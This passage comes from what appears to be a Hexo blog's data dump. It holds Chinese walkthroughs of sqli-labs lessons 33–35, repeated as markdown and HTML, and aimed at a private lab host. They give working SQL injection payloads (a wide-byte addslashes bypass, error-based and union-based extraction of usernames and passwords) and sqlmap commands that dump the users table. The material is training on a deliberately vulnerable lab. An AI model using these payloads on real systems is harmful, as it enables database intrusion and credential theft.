--dump`\n\n![007](/img/sql/Lesson-33/007.png)\n\n![008](/img/sql/Lesson-33/008.png)\n\n\n\n\n\n\n\n","source":"_posts/sqli-labs-lession-33-GET-绕过AddSlashes.md","raw":"---\ntitle: sqli-labs lession-33 GET-绕过AddSlashes\ndate: 2018-10-15 14:40:01\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession-33 GET-绕过AddSlashes\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-33/001.png)\n\n## 分析\n\n![002](/img/sql/Lesson-33/002.png)\n\n由于使用了addslashes函数将单引号（`’`）转义，但是使用了gbk编码,同样使用宽字节绕过。\n\n![003](/img/sql/Lesson-33/003.png)\n\n## 注入\n\n跟上一课payload一模一样,过程图就不放上来了。\n\n{% post_link sqli-labs-lession-32-GET-绕过自定义过滤器-向危险字符添加斜杠 点击查看Lesson-32%}\n\n`http://192.168.75.132/sql/Less-33/?id=1%df'and extractvalue(null,concat(0x7e,(select concat(username,password) from users limit 0,1),0x7e))%23`\n\n![004](/img/sql/Lesson-33/004.png)\n\n## SQLMAP\n\ntamper自带了宽字节绕过的脚本unmagicquotes.py\n\n`sqlmap -u \"http://192.168.75.132/sql/Less-33/?id=1'\" --dbms mysql --technique E --tamper unmagicquotes.py --threads 10 -v 3`\n\n![006](/img/sql/Lesson-33/006.png)\n\n![005](/img/sql/Lesson-33/005.png)\n\n直接上结果\n\n`sqlmap -u \"http://192.168.75.132/sql/Less-33/?id=1'\" --dbms mysql --technique E --tamper unmagicquotes.py --threads 10 -D security -T users --columns --dump`\n\n![007](/img/sql/Lesson-33/007.png)\n\n![008](/img/sql/Lesson-33/008.png)\n\n\n\n\n\n\n\n","slug":"sqli-labs-lession-33-GET-绕过AddSlashes","published":1,"updated":"2019-06-19T17:23:13.391Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3iste5004a4dsbxuco0so5","content":"<h1 id=\"sqli-labs-lession-33-GET-绕过AddSlashes\"><a href=\"#sqli-labs-lession-33-GET-绕过AddSlashes\" class=\"headerlink\" title=\"sqli-labs lession-33 GET-绕过AddSlashes\"></a>sqli-labs lession-33 GET-绕过AddSlashes</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-33/001.png\" alt=\"001\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p><img src=\"/img/sql/Lesson-33/002.png\" alt=\"002\"></p>\n<p>由于使用了addslashes函数将单引号（<code>’</code>）转义，但是使用了gbk编码,同样使用宽字节绕过。</p>\n<p><img src=\"/img/sql/Lesson-33/003.png\" alt=\"003\"></p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p>跟上一课payload一模一样,过程图就不放上来了。</p>\n<a href=\"/2018/10/14/sqli-labs-lession-32-GET-绕过自定义过滤器-向危险字符添加斜杠/\" title=\"点击查看Lesson-32\">点击查看Lesson-32</a>\n\n<p><code>http://192.168.75.132/sql/Less-33/?id=1%df&#39;and extractvalue(null,concat(0x7e,(select concat(username,password) from users limit 0,1),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-33/004.png\" alt=\"004\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p>tamper自带了宽字节绕过的脚本unmagicquotes.py</p>\n<p><code>sqlmap -u &quot;http://192.168.75.132/sql/Less-33/?id=1&#39;&quot; --dbms mysql --technique E --tamper unmagicquotes.py --threads 10 -v 3</code></p>\n<p><img src=\"/img/sql/Lesson-33/006.png\" alt=\"006\"></p>\n<p><img src=\"/img/sql/Lesson-33/005.png\" alt=\"005\"></p>\n<p>直接上结果</p>\n<p><code>sqlmap -u &quot;http://192.168.75.132/sql/Less-33/?id=1&#39;&quot; --dbms mysql --technique E --tamper unmagicquotes.py --threads 10 -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-33/007.png\" alt=\"007\"></p>\n<p><img src=\"/img/sql/Lesson-33/008.png\" alt=\"008\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-33-GET-绕过AddSlashes\"><a href=\"#sqli-labs-lession-33-GET-绕过AddSlashes\" class=\"headerlink\" title=\"sqli-labs lession-33 GET-绕过AddSlashes\"></a>sqli-labs lession-33 GET-绕过AddSlashes</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-33/001.png\" alt=\"001\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p><img src=\"/img/sql/Lesson-33/002.png\" alt=\"002\"></p>\n<p>由于使用了addslashes函数将单引号（<code>’</code>）转义，但是使用了gbk编码,同样使用宽字节绕过。</p>\n<p><img src=\"/img/sql/Lesson-33/003.png\" alt=\"003\"></p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p>跟上一课payload一模一样,过程图就不放上来了。</p>\n<a href=\"/2018/10/14/sqli-labs-lession-32-GET-绕过自定义过滤器-向危险字符添加斜杠/\" title=\"点击查看Lesson-32\">点击查看Lesson-32</a>\n\n<p><code>http://192.168.75.132/sql/Less-33/?id=1%df&#39;and extractvalue(null,concat(0x7e,(select concat(username,password) from users limit 0,1),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-33/004.png\" alt=\"004\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p>tamper自带了宽字节绕过的脚本unmagicquotes.py</p>\n<p><code>sqlmap -u &quot;http://192.168.75.132/sql/Less-33/?id=1&#39;&quot; --dbms mysql --technique E --tamper unmagicquotes.py --threads 10 -v 3</code></p>\n<p><img src=\"/img/sql/Lesson-33/006.png\" alt=\"006\"></p>\n<p><img src=\"/img/sql/Lesson-33/005.png\" alt=\"005\"></p>\n<p>直接上结果</p>\n<p><code>sqlmap -u &quot;http://192.168.75.132/sql/Less-33/?id=1&#39;&quot; --dbms mysql --technique E --tamper unmagicquotes.py --threads 10 -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-33/007.png\" alt=\"007\"></p>\n<p><img src=\"/img/sql/Lesson-33/008.png\" alt=\"008\"></p>\n"},{"title":"sqli-labs lession-34 POST-绕过AddSlashes","date":"2018-10-15T11:06:26.000Z","_content":"\n# sqli-labs lession-34 POST-绕过AddSlashes\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-34/001.png)\n\n## 注入\n\n和前几课一样,不过类型是POST罢了。\n\n这里hackbar不好用了,用burpsuite做。\n\n![002](/img/sql/Lesson-34/002.png)\n\n最终结果\n\n![003](/img/sql/Lesson-34/003.png)\n\n把Lesson-32的payload直接复制进uname就行，详细过程查看Lesson-32\n\n{% post_link sqli-labs-lession-32-GET-绕过自定义过滤器-向危险字符添加斜杠 点击查看Lesson-32%}\n\n## SQLMAP\n\n```\n--data :指定请求内容\n-p uname:指定检测参数仅uname\n--method POST:指定请求方式为POST\n--dbms mysql:指定后端数据库为mysql\n--threads 10:并发线程最大为10 \n--technique E：指定检测payload为报错注入\n--tamper unmagicquotes.py：unmagicquotes.py脚本会使用宽字节绕过方法\n-v 3：\n\n1.只显示python错误以及严重的信息。\n2.同时显示基本信息和警告信息。（默认）\n3.同时显示debug信息。\n4.同时显示注入的payload。\n5.同时显示HTTP请求。\n6.同时显示HTTP响应头。\n7.同时显示HTTP响应页面\n```\n\n`sqlmap -u \"http://192.168.75.132/sql/Less-34/\" --data \"uname=admin'&passwd=123&submit=Submit\" -p uname --method POST --dbms mysql --threads 10 --technique E --tamper unmagicquotes.py -v 3`\n\n![004](/img/sql/Lesson-34/004.png)\n\n![005](/img/sql/Lesson-34/005.png)\n\n`sqlmap -u \"http://192.168.75.132/sql/Less-34/\" --data \"uname=admin'&passwd=123&submit=Submit\" -p uname --method POST --dbms mysql --threads 10 --technique E --tamper unmagicquotes.py --dbs`\n\n![006](/img/sql/Lesson-34/006.png)\n\n![007](/img/sql/Lesson-34/007.png)\n\n`sqlmap -u \"http://192.168.75.132/sql/Less-34/\" --data \"uname=admin'&passwd=123&submit=Submit\" -p uname --method POST --dbms mysql --threads 10 --technique E --tamper unmagicquotes.py -D security --tables`\n\n![008](/img/sql/Lesson-34/008.png)\n\n![009](/img/sql/Lesson-34/009.png)\n\n`sqlmap -u \"http://192.168.75.132/sql/Less-34/\" --data \"uname=admin'&passwd=123&submit=Submit\" -p uname --method POST --dbms mysql --threads 10 --technique E --tamper unmagicquotes.py -D security -T users --columns --dump`\n\n![010](/img/sql/Lesson-34/010.png)\n\n![011](/img/sql/Lesson-34/011.png)","source":"_posts/sqli-labs-lession-34-POST-绕过AddSlashes.md","raw":"---\ntitle: sqli-labs lession-34 POST-绕过AddSlashes\ndate: 2018-10-15 19:06:26\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession-34 POST-绕过AddSlashes\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-34/001.png)\n\n## 注入\n\n和前几课一样,不过类型是POST罢了。\n\n这里hackbar不好用了,用burpsuite做。\n\n![002](/img/sql/Lesson-34/002.png)\n\n最终结果\n\n![003](/img/sql/Lesson-34/003.png)\n\n把Lesson-32的payload直接复制进uname就行，详细过程查看Lesson-32\n\n{% post_link sqli-labs-lession-32-GET-绕过自定义过滤器-向危险字符添加斜杠 点击查看Lesson-32%}\n\n## SQLMAP\n\n```\n--data :指定请求内容\n-p uname:指定检测参数仅uname\n--method POST:指定请求方式为POST\n--dbms mysql:指定后端数据库为mysql\n--threads 10:并发线程最大为10 \n--technique E：指定检测payload为报错注入\n--tamper unmagicquotes.py：unmagicquotes.py脚本会使用宽字节绕过方法\n-v 3：\n\n1.只显示python错误以及严重的信息。\n2.同时显示基本信息和警告信息。（默认）\n3.同时显示debug信息。\n4.同时显示注入的payload。\n5.同时显示HTTP请求。\n6.同时显示HTTP响应头。\n7.同时显示HTTP响应页面\n```\n\n`sqlmap -u \"http://192.168.75.132/sql/Less-34/\" --data \"uname=admin'&passwd=123&submit=Submit\" -p uname --method POST --dbms mysql --threads 10 --technique E --tamper unmagicquotes.py -v 3`\n\n![004](/img/sql/Lesson-34/004.png)\n\n![005](/img/sql/Lesson-34/005.png)\n\n`sqlmap -u \"http://192.168.75.132/sql/Less-34/\" --data \"uname=admin'&passwd=123&submit=Submit\" -p uname --method POST --dbms mysql --threads 10 --technique E --tamper unmagicquotes.py --dbs`\n\n![006](/img/sql/Lesson-34/006.png)\n\n![007](/img/sql/Lesson-34/007.png)\n\n`sqlmap -u \"http://192.168.75.132/sql/Less-34/\" --data \"uname=admin'&passwd=123&submit=Submit\" -p uname --method POST --dbms mysql --threads 10 --technique E --tamper unmagicquotes.py -D security --tables`\n\n![008](/img/sql/Lesson-34/008.png)\n\n![009](/img/sql/Lesson-34/009.png)\n\n`sqlmap -u \"http://192.168.75.132/sql/Less-34/\" --data \"uname=admin'&passwd=123&submit=Submit\" -p uname --method POST --dbms mysql --threads 10 --technique E --tamper unmagicquotes.py -D security -T users --columns --dump`\n\n![010](/img/sql/Lesson-34/010.png)\n\n![011](/img/sql/Lesson-34/011.png)","slug":"sqli-labs-lession-34-POST-绕过AddSlashes","published":1,"updated":"2019-06-19T17:23:13.391Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3iste7004d4dsb59b8p3yu","content":"<h1 id=\"sqli-labs-lession-34-POST-绕过AddSlashes\"><a href=\"#sqli-labs-lession-34-POST-绕过AddSlashes\" class=\"headerlink\" title=\"sqli-labs lession-34 POST-绕过AddSlashes\"></a>sqli-labs lession-34 POST-绕过AddSlashes</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-34/001.png\" alt=\"001\"></p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p>和前几课一样,不过类型是POST罢了。</p>\n<p>这里hackbar不好用了,用burpsuite做。</p>\n<p><img src=\"/img/sql/Lesson-34/002.png\" alt=\"002\"></p>\n<p>最终结果</p>\n<p><img src=\"/img/sql/Lesson-34/003.png\" alt=\"003\"></p>\n<p>把Lesson-32的payload直接复制进uname就行，详细过程查看Lesson-32</p>\n<a href=\"/2018/10/14/sqli-labs-lession-32-GET-绕过自定义过滤器-向危险字符添加斜杠/\" title=\"点击查看Lesson-32\">点击查看Lesson-32</a>\n\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><figure class=\"highlight oxygene\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--data :指定请求内容</span><br><span class=\"line\">-p uname:指定检测参数仅uname</span><br><span class=\"line\">--<span class=\"function\"><span class=\"keyword\">method</span> <span class=\"title\">POST</span>:</span>指定请求方式为POST</span><br><span class=\"line\">--dbms mysql:指定后端数据库为mysql</span><br><span class=\"line\">--threads <span class=\"number\">10</span>:并发线程最大为<span class=\"number\">10</span> </span><br><span class=\"line\">--technique E：指定检测payload为报错注入</span><br><span class=\"line\">--tamper unmagicquotes.py：unmagicquotes.py脚本会使用宽字节绕过方法</span><br><span class=\"line\">-v <span class=\"number\">3</span>：</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">1</span>.只显示python错误以及严重的信息。</span><br><span class=\"line\"><span class=\"number\">2</span>.同时显示基本信息和警告信息。（默认）</span><br><span class=\"line\"><span class=\"number\">3</span>.同时显示debug信息。</span><br><span class=\"line\"><span class=\"number\">4</span>.同时显示注入的payload。</span><br><span class=\"line\"><span class=\"number\">5</span>.同时显示HTTP请求。</span><br><span class=\"line\"><span class=\"number\">6</span>.同时显示HTTP响应头。</span><br><span class=\"line\"><span class=\"number\">7</span>.同时显示HTTP响应页面</span><br></pre></td></tr></table></figure>\n\n<p><code>sqlmap -u &quot;http://192.168.75.132/sql/Less-34/&quot; --data &quot;uname=admin&#39;&amp;passwd=123&amp;submit=Submit&quot; -p uname --method POST --dbms mysql --threads 10 --technique E --tamper unmagicquotes.py -v 3</code></p>\n<p><img src=\"/img/sql/Lesson-34/004.png\" alt=\"004\"></p>\n<p><img src=\"/img/sql/Lesson-34/005.png\" alt=\"005\"></p>\n<p><code>sqlmap -u &quot;http://192.168.75.132/sql/Less-34/&quot; --data &quot;uname=admin&#39;&amp;passwd=123&amp;submit=Submit&quot; -p uname --method POST --dbms mysql --threads 10 --technique E --tamper unmagicquotes.py --dbs</code></p>\n<p><img src=\"/img/sql/Lesson-34/006.png\" alt=\"006\"></p>\n<p><img src=\"/img/sql/Lesson-34/007.png\" alt=\"007\"></p>\n<p><code>sqlmap -u &quot;http://192.168.75.132/sql/Less-34/&quot; --data &quot;uname=admin&#39;&amp;passwd=123&amp;submit=Submit&quot; -p uname --method POST --dbms mysql --threads 10 --technique E --tamper unmagicquotes.py -D security --tables</code></p>\n<p><img src=\"/img/sql/Lesson-34/008.png\" alt=\"008\"></p>\n<p><img src=\"/img/sql/Lesson-34/009.png\" alt=\"009\"></p>\n<p><code>sqlmap -u &quot;http://192.168.75.132/sql/Less-34/&quot; --data &quot;uname=admin&#39;&amp;passwd=123&amp;submit=Submit&quot; -p uname --method POST --dbms mysql --threads 10 --technique E --tamper unmagicquotes.py -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-34/010.png\" alt=\"010\"></p>\n<p><img src=\"/img/sql/Lesson-34/011.png\" alt=\"011\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-34-POST-绕过AddSlashes\"><a href=\"#sqli-labs-lession-34-POST-绕过AddSlashes\" class=\"headerlink\" title=\"sqli-labs lession-34 POST-绕过AddSlashes\"></a>sqli-labs lession-34 POST-绕过AddSlashes</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-34/001.png\" alt=\"001\"></p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p>和前几课一样,不过类型是POST罢了。</p>\n<p>这里hackbar不好用了,用burpsuite做。</p>\n<p><img src=\"/img/sql/Lesson-34/002.png\" alt=\"002\"></p>\n<p>最终结果</p>\n<p><img src=\"/img/sql/Lesson-34/003.png\" alt=\"003\"></p>\n<p>把Lesson-32的payload直接复制进uname就行，详细过程查看Lesson-32</p>\n<a href=\"/2018/10/14/sqli-labs-lession-32-GET-绕过自定义过滤器-向危险字符添加斜杠/\" title=\"点击查看Lesson-32\">点击查看Lesson-32</a>\n\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><figure class=\"highlight oxygene\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--data :指定请求内容</span><br><span class=\"line\">-p uname:指定检测参数仅uname</span><br><span class=\"line\">--<span class=\"function\"><span class=\"keyword\">method</span> <span class=\"title\">POST</span>:</span>指定请求方式为POST</span><br><span class=\"line\">--dbms mysql:指定后端数据库为mysql</span><br><span class=\"line\">--threads <span class=\"number\">10</span>:并发线程最大为<span class=\"number\">10</span> </span><br><span class=\"line\">--technique E：指定检测payload为报错注入</span><br><span class=\"line\">--tamper unmagicquotes.py：unmagicquotes.py脚本会使用宽字节绕过方法</span><br><span class=\"line\">-v <span class=\"number\">3</span>：</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">1</span>.只显示python错误以及严重的信息。</span><br><span class=\"line\"><span class=\"number\">2</span>.同时显示基本信息和警告信息。（默认）</span><br><span class=\"line\"><span class=\"number\">3</span>.同时显示debug信息。</span><br><span class=\"line\"><span class=\"number\">4</span>.同时显示注入的payload。</span><br><span class=\"line\"><span class=\"number\">5</span>.同时显示HTTP请求。</span><br><span class=\"line\"><span class=\"number\">6</span>.同时显示HTTP响应头。</span><br><span class=\"line\"><span class=\"number\">7</span>.同时显示HTTP响应页面</span><br></pre></td></tr></table></figure>\n\n<p><code>sqlmap -u &quot;http://192.168.75.132/sql/Less-34/&quot; --data &quot;uname=admin&#39;&amp;passwd=123&amp;submit=Submit&quot; -p uname --method POST --dbms mysql --threads 10 --technique E --tamper unmagicquotes.py -v 3</code></p>\n<p><img src=\"/img/sql/Lesson-34/004.png\" alt=\"004\"></p>\n<p><img src=\"/img/sql/Lesson-34/005.png\" alt=\"005\"></p>\n<p><code>sqlmap -u &quot;http://192.168.75.132/sql/Less-34/&quot; --data &quot;uname=admin&#39;&amp;passwd=123&amp;submit=Submit&quot; -p uname --method POST --dbms mysql --threads 10 --technique E --tamper unmagicquotes.py --dbs</code></p>\n<p><img src=\"/img/sql/Lesson-34/006.png\" alt=\"006\"></p>\n<p><img src=\"/img/sql/Lesson-34/007.png\" alt=\"007\"></p>\n<p><code>sqlmap -u &quot;http://192.168.75.132/sql/Less-34/&quot; --data &quot;uname=admin&#39;&amp;passwd=123&amp;submit=Submit&quot; -p uname --method POST --dbms mysql --threads 10 --technique E --tamper unmagicquotes.py -D security --tables</code></p>\n<p><img src=\"/img/sql/Lesson-34/008.png\" alt=\"008\"></p>\n<p><img src=\"/img/sql/Lesson-34/009.png\" alt=\"009\"></p>\n<p><code>sqlmap -u &quot;http://192.168.75.132/sql/Less-34/&quot; --data &quot;uname=admin&#39;&amp;passwd=123&amp;submit=Submit&quot; -p uname --method POST --dbms mysql --threads 10 --technique E --tamper unmagicquotes.py -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-34/010.png\" alt=\"010\"></p>\n<p><img src=\"/img/sql/Lesson-34/011.png\" alt=\"011\"></p>\n"},{"title":"sqli-labs lession-35 GET-不需要绕过AddSlashes-整型","date":"2018-10-15T11:48:11.000Z","_content":"\n## 登录界面\n\n![001](/img/sql/Lesson-35/001.png)\n\n## 分析\n\n![002](/img/sql/Lesson-35/002.png)\n\n数字型的注入是不需要用到双引号的,当遇到表名用双引号包起来的时候转成16进制编码的即可。\n\n## 注入\n\n### 判断注入类型\n\n输入单引号报错\n\n![003](/img/sql/Lesson-35/003.png)\n\n![004](/img/sql/Lesson-35/004.png)\n\n通过`http://192.168.75.132/sql/Less-35/?id=1 and 1=2`确定是数字型,如果是字符型应该像第一课一样显示出id=1的内容。\n\n### 获取字段数\n\n`http://192.168.75.132/sql/Less-35/?id=1 order by 3%23`\n\n![005](/img/sql/Lesson-35/005.png)\n\n### 获取数据库名\n\n`http://192.168.75.132/sql/Less-35/?id=-1 union select 1,2,3%23`\n\n![006](/img/sql/Lesson-35/006.png)\n\n`http://192.168.75.132/sql/Less-35/?id=-1 union select 1,(database()),3%23`\n\n![007](/img/sql/Lesson-35/007.png)\n\n### 获取表名\n\n`http://192.168.75.132/sql/Less-35/?id=-1 union select 1,(select group_concat(table_name)from information_schema.tables where table_schema=0x7365637572697479),3%23`\n\n其中原来的`'security'`用`0x7365637572697479`替代,绕过了使用单引号。\n\n![008](/img/sql/Lesson-35/008.png)\n\n### 获取列名\n\n`users`用`0x7573657273`替代。\n\n`http://192.168.75.132/sql/Less-35/?id=-1 union select 1,(select group_concat(column_name)from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273),3%23`\n\n![009](/img/sql/Lesson-35/009.png)\n\n### 获取字段\n\n`http://192.168.75.132/sql/Less-35/?id=-1 union select 1,(select group_concat(username,0x7e,password) from users),3%23`\n\n![010](/img/sql/Lesson-35/010.png)\n\n## SQLMAP\n\n`sqlmap -u \"http://192.168.75.132/sql/Less-35/?id=1\" --dbms mysql -v 3 --technique E --flush-session --fresh-queries`\n\n![011](/img/sql/Lesson-35/011.png)\n\n![012](/img/sql/Lesson-35/012.png)\n\n没什么好说的，直接上结果。\n\n`sqlmap -u \"http://192.168.75.132/sql/Less-35/?id=1\" --dbms mysql -v 3 --technique E -D security -T users --columns --dump`\n\n![013](/img/sql/Lesson-35/013.png)\n\n![014](/img/sql/Lesson-35/014.png)\n\n\n\n","source":"_posts/sqli-labs-lession-35-GET-不需要绕过AddSlashes-整型.md","raw":"---\ntitle: sqli-labs lession-35 GET-不需要绕过AddSlashes-整型\ndate: 2018-10-15 19:48:11\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-35/001.png)\n\n## 分析\n\n![002](/img/sql/Lesson-35/002.png)\n\n数字型的注入是不需要用到双引号的,当遇到表名用双引号包起来的时候转成16进制编码的即可。\n\n## 注入\n\n### 判断注入类型\n\n输入单引号报错\n\n![003](/img/sql/Lesson-35/003.png)\n\n![004](/img/sql/Lesson-35/004.png)\n\n通过`http://192.168.75.132/sql/Less-35/?id=1 and 1=2`确定是数字型,如果是字符型应该像第一课一样显示出id=1的内容。\n\n### 获取字段数\n\n`http://192.168.75.132/sql/Less-35/?id=1 order by 3%23`\n\n![005](/img/sql/Lesson-35/005.png)\n\n### 获取数据库名\n\n`http://192.168.75.132/sql/Less-35/?id=-1 union select 1,2,3%23`\n\n![006](/img/sql/Lesson-35/006.png)\n\n`http://192.168.75.132/sql/Less-35/?id=-1 union select 1,(database()),3%23`\n\n![007](/img/sql/Lesson-35/007.png)\n\n### 获取表名\n\n`http://192.168.75.132/sql/Less-35/?id=-1 union select 1,(select group_concat(table_name)from information_schema.tables where table_schema=0x7365637572697479),3%23`\n\n其中原来的`'security'`用`0x7365637572697479`替代,绕过了使用单引号。\n\n![008](/img/sql/Lesson-35/008.png)\n\n### 获取列名\n\n`users`用`0x7573657273`替代。\n\n`http://192.168.75.132/sql/Less-35/?id=-1 union select 1,(select group_concat(column_name)from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273),3%23`\n\n![009](/img/sql/Lesson-35/009.png)\n\n### 获取字段\n\n`http://192.168.75.132/sql/Less-35/?id=-1 union select 1,(select group_concat(username,0x7e,password) from users),3%23`\n\n![010](/img/sql/Lesson-35/010.png)\n\n## SQLMAP\n\n`sqlmap -u \"http://192.168.75.132/sql/Less-35/?id=1\" --dbms mysql -v 3 --technique E --flush-session --fresh-queries`\n\n![011](/img/sql/Lesson-35/011.png)\n\n![012](/img/sql/Lesson-35/012.png)\n\n没什么好说的，直接上结果。\n\n`sqlmap -u \"http://192.168.75.132/sql/Less-35/?id=1\" --dbms mysql -v 3 --technique E -D security -T users --columns --dump`\n\n![013](/img/sql/Lesson-35/013.png)\n\n![014](/img/sql/Lesson-35/014.png)\n\n\n\n","slug":"sqli-labs-lession-35-GET-不需要绕过AddSlashes-整型","published":1,"updated":"2019-06-19T17:23:13.392Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3iste9004i4dsbbxeb9cmw","content":"<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-35/001.png\" alt=\"001\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p><img src=\"/img/sql/Lesson-35/002.png\" alt=\"002\"></p>\n<p>数字型的注入是不需要用到双引号的,当遇到表名用双引号包起来的时候转成16进制编码的即可。</p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><h3 id=\"判断注入类型\"><a href=\"#判断注入类型\" class=\"headerlink\" title=\"判断注入类型\"></a>判断注入类型</h3><p>输入单引号报错</p>\n<p><img src=\"/img/sql/Lesson-35/003.png\" alt=\"003\"></p>\n<p><img src=\"/img/sql/Lesson-35/004.png\" alt=\"004\"></p>\n<p>通过<code>http://192.168.75.132/sql/Less-35/?id=1 and 1=2</code>确定是数字型,如果是字符型应该像第一课一样显示出id=1的内容。</p>\n<h3 id=\"获取字段数\"><a href=\"#获取字段数\" class=\"headerlink\" title=\"获取字段数\"></a>获取字段数</h3><p><code>http://192.168.75.132/sql/Less-35/?id=1 order by 3%23</code></p>\n<p><img src=\"/img/sql/Lesson-35/005.png\" alt=\"005\"></p>\n<h3 id=\"获取数据库名\"><a href=\"#获取数据库名\" class=\"headerlink\" title=\"获取数据库名\"></a>获取数据库名</h3><p><code>http://192.168.75.132/sql/Less-35/?id=-1 union select 1,2,3%23</code></p>\n<p><img src=\"/img/sql/Lesson-35/006.png\" alt=\"006\"></p>\n<p><code>http://192.168.75.132/sql/Less-35/?id=-1 union select 1,(database()),3%23</code></p>\n<p><img src=\"/img/sql/Lesson-35/007.png\" alt=\"007\"></p>\n<h3 id=\"获取表名\"><a href=\"#获取表名\" class=\"headerlink\" title=\"获取表名\"></a>获取表名</h3><p><code>http://192.168.75.132/sql/Less-35/?id=-1 union select 1,(select group_concat(table_name)from information_schema.tables where table_schema=0x7365637572697479),3%23</code></p>\n<p>其中原来的<code>&#39;security&#39;</code>用<code>0x7365637572697479</code>替代,绕过了使用单引号。</p>\n<p><img src=\"/img/sql/Lesson-35/008.png\" alt=\"008\"></p>\n<h3 id=\"获取列名\"><a href=\"#获取列名\" class=\"headerlink\" title=\"获取列名\"></a>获取列名</h3><p><code>users</code>用<code>0x7573657273</code>替代。</p>\n<p><code>http://192.168.75.132/sql/Less-35/?id=-1 union select 1,(select group_concat(column_name)from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273),3%23</code></p>\n<p><img src=\"/img/sql/Lesson-35/009.png\" alt=\"009\"></p>\n<h3 id=\"获取字段\"><a href=\"#获取字段\" class=\"headerlink\" title=\"获取字段\"></a>获取字段</h3><p><code>http://192.168.75.132/sql/Less-35/?id=-1 union select 1,(select group_concat(username,0x7e,password) from users),3%23</code></p>\n<p><img src=\"/img/sql/Lesson-35/010.png\" alt=\"010\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p><code>sqlmap -u &quot;http://192.168.75.132/sql/Less-35/?id=1&quot; --dbms mysql -v 3 --technique E --flush-session --fresh-queries</code></p>\n<p><img src=\"/img/sql/Lesson-35/011.png\" alt=\"011\"></p>\n<p><img src=\"/img/sql/Lesson-35/012.png\" alt=\"012\"></p>\n<p>没什么好说的，直接上结果。</p>\n<p><code>sqlmap -u &quot;http://192.168.75.132/sql/Less-35/?id=1&quot; --dbms mysql -v 3 --technique E -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-35/013.png\" alt=\"013\"></p>\n<p><img src=\"/img/sql/Lesson-35/014.png\" 